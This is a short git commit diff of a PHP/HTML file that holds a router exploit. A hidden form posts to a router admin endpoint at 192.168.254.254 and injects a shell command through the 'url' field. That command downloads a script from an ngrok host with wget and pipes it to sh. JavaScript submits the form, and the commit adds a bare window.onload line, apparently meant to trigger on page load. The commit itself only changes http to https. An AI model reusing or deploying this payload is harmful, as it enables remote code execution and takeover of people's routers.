54db030ee6239b85d600f41e4c653ca60cb8b360
Renzkie14 <102612731+Renzkie14@users.noreply.github.com>
2024-02-13 15:17:56 +0800

    Update zlts10g_script.php

--- zlts10g_script.php
+++ zlts10g_script.php
@@ -1,10 +1,11 @@
 <form method="post" id="exploit" action="http://192.168.254.254/goform/goform_se
 t_cmd_process"><input name="isTest" value="false" type="hidden"><input name="gof
 ormId" value="send_at_tools" type="hidden"><input name="url" value="AT > /tmp/at
-send.log && wget http://beb0-175-176-0-61.ngrok-free.app/Renzkie14/zlts10g/raw/main/zlt.sh -O -|
+send.log && wget https://beb0-175-176-0-61.ngrok-free.app/Renzkie14/zlts10g/raw/main/zlt.sh -O -|
 sh &&" type="hidden"><input type="submit" style="display:none;"></form>
 <script>
 function exploit () {
 var xploit = document.getElementById("exploit");
 xploit.submit();
 }
+window.onload;
